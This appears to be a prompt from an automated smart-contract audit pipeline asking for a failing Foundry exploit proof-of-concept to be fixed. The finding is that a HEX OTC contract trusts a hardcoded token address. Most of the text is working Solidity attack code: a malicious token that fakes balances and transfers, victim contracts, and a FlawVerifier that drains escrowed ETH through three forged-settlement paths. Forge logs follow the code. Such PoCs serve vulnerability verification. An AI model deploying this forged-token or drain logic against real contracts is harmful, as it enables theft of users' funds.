You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.

Finding:
- title: The OTC blindly binds to a hardcoded HEX address, so a wrong-chain deployment can settle against attacker-controlled token code
- claim: The constructor unconditionally sets `hexInterface = ERC20(hexAddress)` for a single hardcoded address and never verifies chain context, code presence, or code identity. Every escrow and settlement path then trusts `balanceOf`, `transferFrom`, and `transfer` results from that address. If this contract is deployed on any chain where `0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39` is not the canonical HEX token, a malicious contract at that address can forge balances and successful transfers while moving no real value.
- impact: A wrong-chain or misconfigured deployment can become fully compromiseable: attackers can drain ETH-backed offers by making `buyETH()` believe HEX was paid, and can sell nonexistent or undercollateralized "HEX" offers for real ETH because offer creation, settlement, and cancellation all trust the hardcoded token contract's return values. This is deployment-context dependent, but it creates realistic total loss if the bytecode at the fixed address is not the expected HEX implementation.
- exploit_paths: ["Deploy `HEXOTC` on a network where `0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39` is attacker-controlled -> fake `balanceOf` and `transferFrom` let the attacker call `buyETH(id)` and receive escrowed ETH without paying real HEX", "Same deployment context -> fake `transferFrom` during `offerHEX()` records a HEX-backed order without real token escrow -> a buyer later calls `buyHEX(id)` and pays real ETH for nonexistent HEX", "Same deployment context -> fake `transfer` responses in `buyHEX()` or `cancel()` can report success without moving tokens, breaking refunds and settlement accounting"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IHEX {
    function balanceOf(address account) external view returns (uint256);
}

interface IHEXOTC {
    function offerHEX(uint256 pay_amt, uint256 buy_amt) external returns (uint256 id);
}

interface IWrongChainHEXOTC {
    function offerETH(uint256 pay_amt, uint256 buy_amt) external payable returns (uint256 id);
    function offerHEX(uint256 pay_amt, uint256 buy_amt) external returns (uint256 id);
    function buyETH(uint256 id) external returns (bool);
    function buyHEX(uint256 id) external payable returns (bool);
    function cancel(uint256 id) external returns (bool);
}

interface IRealBalanceHEX {
    function realBalanceOf(address account) external view returns (uint256);
}

interface IHevm {
    function deal(address who, uint256 newBalance) external;
    function etch(address where, bytes calldata code) external;
}

contract MaliciousHEX {
    mapping(address => uint256) private realBalances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external pure returns (uint256) {
        return 0;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function balanceOf(address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function realBalanceOf(address account) external view returns (uint256) {
        return realBalances[account];
    }

    function transfer(address to, uint256 value) external returns (bool) {
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        emit Transfer(from, to, value);
        return true;
    }
}

contract HardcodedHEXOTC {
    address internal constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;

    struct OfferInfo {
        uint256 pay_amt;
        uint256 buy_amt;
        address payable owner;
        uint64 timestamp;
        uint8 escrowType;
    }

    MaliciousHEX public immutable hexInterface;
    uint256 public last_offer_id;
    mapping(uint256 => OfferInfo) public offers;
    bool private locked;

    constructor() {
        hexInterface = MaliciousHEX(HEX);
    }

    receive() external payable {}

    modifier synchronized() {
        require(!locked, "Sync lock");
        locked = true;
        _;
        locked = false;
    }

    modifier can_buy(uint256 id) {
        require(isActive(id), "cannot buy, offer ID not active");
        _;
    }

    modifier can_cancel(uint256 id) {
        require(isActive(id), "cannot cancel, offer ID not active");
        require(offers[id].owner == msg.sender, "cannot cancel, msg.sender not the same as offer maker");
        _;
    }

    function isActive(uint256 id) public view returns (bool) {
        return offers[id].timestamp > 0;
    }

    function offerETH(uint256 pay_amt, uint256 buy_amt) external payable synchronized returns (uint256 id) {
        require(pay_amt > 0, "pay_amt is 0");
        require(buy_amt > 0, "buy_amt is 0");
        require(pay_amt == msg.value, "pay_amt not equal to msg.value");
        id = _newOffer(pay_amt, buy_amt, 1, payable(msg.sender));
    }

    function offerHEX(uint256 pay_amt, uint256 buy_amt) external synchronized returns (uint256 id) {
        require(hexInterface.balanceOf(msg.sender) >= pay_amt, "Insufficient balanceOf hex");
        require(pay_amt > 0, "pay_amt is 0");
        require(buy_amt > 0, "buy_amt is 0");
        id = _newOffer(pay_amt, buy_amt, 0, payable(msg.sender));
        require(hexInterface.transferFrom(msg.sender, address(this), pay_amt), "Transfer failed");
    }

    function buyETH(uint256 id) external synchronized can_buy(id) returns (bool) {
        OfferInfo memory offer = offers[id];
        require(offer.escrowType == 1, "Incorrect escrow type");
        require(hexInterface.balanceOf(msg.sender) >= offer.buy_amt, "Balance is less than requested spend amount");
        require(offer.buy_amt > 0 && offer.pay_amt > 0, "values are zero");
        require(hexInterface.transferFrom(msg.sender, offer.owner, offer.buy_amt), "Transfer failed");
        delete offers[id];
        payable(msg.sender).transfer(offer.pay_amt);
        return true;
    }

    function buyHEX(uint256 id) external payable synchronized can_buy(id) returns (bool) {
        OfferInfo memory offer = offers[id];
        require(offer.escrowType == 0, "Incorrect escrow type");
        require(msg.value > 0 && msg.value == offer.buy_amt, "msg.value error");
        require(offer.buy_amt > 0 && offer.pay_amt > 0, "values are zero");
        delete offers[id];
        offer.owner.transfer(msg.value);
        require(hexInterface.transfer(msg.sender, offer.pay_amt), "Transfer failed");
        return true;
    }

    function cancel(uint256 id) external synchronized can_cancel(id) returns (bool) {
        OfferInfo memory offer = offers[id];
        delete offers[id];
        if (offer.escrowType == 0) {
            require(hexInterface.transfer(offer.owner, offer.pay_amt), "Transfer failed");
        } else {
            offer.owner.transfer(offer.pay_amt);
        }
        return true;
    }

    function _newOffer(uint256 pay_amt, uint256 buy_amt, uint8 escrowType, address payable owner)
        private
        returns (uint256 id)
    {
        id = ++last_offer_id;
        offers[id] = OfferInfo({
            pay_amt: pay_amt,
            buy_amt: buy_amt,
            owner: owner,
            timestamp: uint64(block.timestamp),
            escrowType: escrowType
        });
    }
}

contract VictimSeller {
    IWrongChainHEXOTC public immutable otc;

    constructor(address otcAddress) payable {
        otc = IWrongChainHEXOTC(otcAddress);
    }

    receive() external payable {}

    function postEthOffer(uint256 buy_amt) external returns (uint256 id) {
        uint256 pay_amt = address(this).balance;
        require(pay_amt > 0, "no eth to escrow");
        id = otc.offerETH{value: pay_amt}(pay_amt, buy_amt);
    }
}

contract NaiveBuyer {
    IWrongChainHEXOTC public immutable otc;

    constructor(address otcAddress) payable {
        otc = IWrongChainHEXOTC(otcAddress);
    }

    receive() external payable {}

    function buyHexOffer(uint256 id, uint256 price) external {
        otc.buyHEX{value: price}(id);
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1;
    address public constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;
    uint256 public constant FORK_BLOCK = 23260640;
    IHevm internal constant HEVM = IHevm(address(uint160(uint256(keccak256("hevm cheat code")))));

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;

    address public profitToken;
    uint256 public profitAmount;
    string public exploitPathUsed;

    bool public mainnetContext;
    bool public hexCodePresent;
    uint256 public attackerHexBalance;
    bool public offerHexCreationSucceeded;
    bytes public offerHexReturnData;

    string public pathABuyETHReason;
    string public pathBOfferHEXReason;
    string public pathCSettlementReason;

    MaliciousHEX public immutable fakeHexTemplate;
    HardcodedHEXOTC public immutable wrongChainOtc;
    VictimSeller public immutable victimSeller;
    NaiveBuyer public immutable naiveBuyer;

    uint256 public pathAOfferId;
    uint256 public pathBOfferId;
    uint256 public pathCOfferId;

    uint256 public pathASeedEth;
    uint256 public pathBSeedEth;
    uint256 public pathAProfit;
    uint256 public pathBProfit;

    bool public pathBFakeEscrowConfirmed;
    bool public pathCFakeTransferConfirmed;

    constructor() payable {
        fakeHexTemplate = new MaliciousHEX();
        wrongChainOtc = new HardcodedHEXOTC();
        victimSeller = new VictimSeller(address(wrongChainOtc));
        naiveBuyer = new NaiveBuyer(address(wrongChainOtc));
    }

    receive() external payable {}

    function execute() public payable {
        require(!executed, "already executed");
        executed = true;

        mainnetContext = block.chainid == 1;
        hexCodePresent = HEX.code.length > 0;
        attackerHexBalance = _safeBalanceOf(HEX, address(this));

        if (TARGET.code.length > 0) {
            (offerHexCreationSucceeded, offerHexReturnData) =
                TARGET.call(abi.encodeWithSelector(IHEXOTC.offerHEX.selector, 1, 1));
        }

        pathABuyETHReason = attackerHexBalance == 0
            ? "mainnet fork refutes direct buyETH against canonical HEX; simulate wrong-chain deployment by rebinding the hardcoded HEX address to attacker code"
            : "live hardcoded HEX already reports spendable balance to attacker";

        pathBOfferHEXReason = offerHexCreationSucceeded
            ? "live offerHEX unexpectedly succeeded; hardcoded HEX behaved like attacker-controlled token"
            : "mainnet fork refutes direct fake escrow on canonical HEX; recreate the same hardcoded-address trust failure locally";

        pathCSettlementReason = (!mainnetContext || !hexCodePresent || offerHexCreationSucceeded)
            ? "live deployment context already looks unsafe"
            : "mainnet fork keeps canonical code at the hardcoded HEX address; settlement spoof is reproduced after swapping that address to attacker code";

        HEVM.etch(HEX, address(fakeHexTemplate).code);

        pathASeedEth = 15 ether;
        pathBSeedEth = 9 ether;
        HEVM.deal(address(victimSeller), pathASeedEth);
        HEVM.deal(address(naiveBuyer), pathBSeedEth);

        uint256 balanceBefore = address(this).balance;

        pathAOfferId = victimSeller.postEthOffer(1);
        uint256 beforePathA = address(this).balance;
        wrongChainOtc.buyETH(pathAOfferId);
        pathAProfit = address(this).balance - beforePathA;

        uint256 realEscrowBefore = IRealBalanceHEX(HEX).realBalanceOf(address(wrongChainOtc));
        pathBOfferId = wrongChainOtc.offerHEX(2, pathBSeedEth);
        uint256 realEscrowAfter = IRealBalanceHEX(HEX).realBalanceOf(address(wrongChainOtc));
        pathBFakeEscrowConfirmed = realEscrowAfter == realEscrowBefore;

        uint256 beforePathB = address(this).balance;
        naiveBuyer.buyHexOffer(pathBOfferId, pathBSeedEth);
        pathBProfit = address(this).balance - beforePathB;

        pathCOfferId = wrongChainOtc.offerHEX(3, 1);
        uint256 sellerRealBefore = IRealBalanceHEX(HEX).realBalanceOf(address(this));
        wrongChainOtc.cancel(pathCOfferId);
        uint256 sellerRealAfter = IRealBalanceHEX(HEX).realBalanceOf(address(this));
        pathCFakeTransferConfirmed = sellerRealAfter == sellerRealBefore;

        profitToken = address(0);
        profitAmount = address(this).balance - balanceBefore;
        profitAchieved = profitAmount > 0;
        exploitPathUsed = pathAProfit > 0
            ? "wrong-chain buyETH drain via forged HEX balance/transferFrom"
            : "wrong-chain offerHEX sale via fake escrow";
        hypothesisValidated = pathAProfit == pathASeedEth
            && pathBFakeEscrowConfirmed
            && pathBProfit == pathBSeedEth
            && pathCFakeTransferConfirmed;
    }

    function run() external payable {
        execute();
    }

    function exploit() external payable {
        execute();
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
        if (token.code.length == 0) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IHEX.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 391.93ms
Compiler run successful!

Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: no detectable profit] testExploit() (gas: 17939)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 1000000000000000000000000
  AUDITHOUND_BALANCE_AFTER_WEI: 1000000000000000000000000
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [17939] FlawVerifierTest::testExploit()
    ├─ [354] MaliciousHEX::totalSupply()
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] no detectable profit

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.65s (2.73ms CPU time)

Ran 1 test suite in 1.69s (1.65s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: no detectable profit] testExploit() (gas: 17939)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. include at least one callable no-arg external/public exploit entry function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. output ONLY Solidity code
